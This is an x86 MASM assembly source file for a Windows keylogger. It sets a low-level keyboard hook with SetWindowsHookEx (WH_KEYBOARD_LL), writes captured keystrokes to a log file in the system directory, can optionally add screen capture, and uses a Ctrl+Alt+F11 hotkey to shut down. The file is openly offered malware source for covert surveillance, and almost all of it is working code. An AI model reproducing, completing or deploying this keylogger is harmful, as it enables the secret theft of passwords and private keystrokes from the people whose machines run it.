;-----------------------------------------------------------------------
.386
.model flat, stdcall
option casemap:none

;-----------------------------------------------------------------------
include project.inc

;-----------------------------------------------------------------------
.code
    GotoSystem  proc
        local   sysdir[MAX_PATH+1]:byte
        
        invoke  GetSystemDirectory, addr sysdir, MAX_PATH
        invoke  SetCurrentDirectory, addr sysdir
        ret
    GotoSystem  endp

    IF ADD_CAPTURE_SCREEN_FEATURE
    include keylog.capturescreen.asm
    ENDIF
    include keylog.core.asm
    
    main:
    
    ; check to make sure we are the only copy of this program running
    ; for this user. For fast user switching we can still have one copy
    ; per user running with this check.
    ;invoke  CreateMutex, 0, 0, addr szMutex
    
    ; but if this user is running one already. we exit
    ;call GetLastError
    ;.if eax != ERROR_ALREADY_EXISTS

        invoke  GotoSystem

        ; Zero Out ebx
        xor ebx, ebx
        
        ; This will switch logger off using CTRL+ALT+F11 together
        ; Name of register key -> "0BADFACE"
        invoke RegisterHotKey, ebx, 0BADFACEh, MOD_CONTROL OR MOD_ALT, VK_F11

        pushz "ab"                  ; append in binary mode
        pushz ".log"         ; name of log file
        call fopen                  ; open the log file
        
        add esp, 2*4                ; all c lib functions need fixup..
        mov [hFile], eax            ; save our file number

        ; get our module handle for setting the hook
        invoke GetModuleHandleA, ebx

        ; Register our keyboard hook proc and start hooking
        ; Where our hook proc is located
        ; Low level key logger WH_KEYBOARD_LL = 13
        invoke SetWindowsHookEx, WH_KEYBOARD_LL, addr KeyBoardProc, eax, ebx
        mov [hHook], eax            ; ok here is our hook handle for later

        ; wait for a message it will be in the message struct
        ; We need to check for messages like our hot key, so we can close when we get it
        invoke  GetMessage, addr msg, ebx, ebx, ebx

        ; we got the hot key, lets close up house 
        ; make sure we unhook things to be nice
        invoke  UnhookWindowsHookEx, [hHook]

        push [hFile]                ; close our logfile before we stop
        call fclose
        add esp, 04

    ;.endif
    
    ; call stop and lets go away
    invoke  ExitProcess, eax

;-----------------------------------------------------------------------
end main
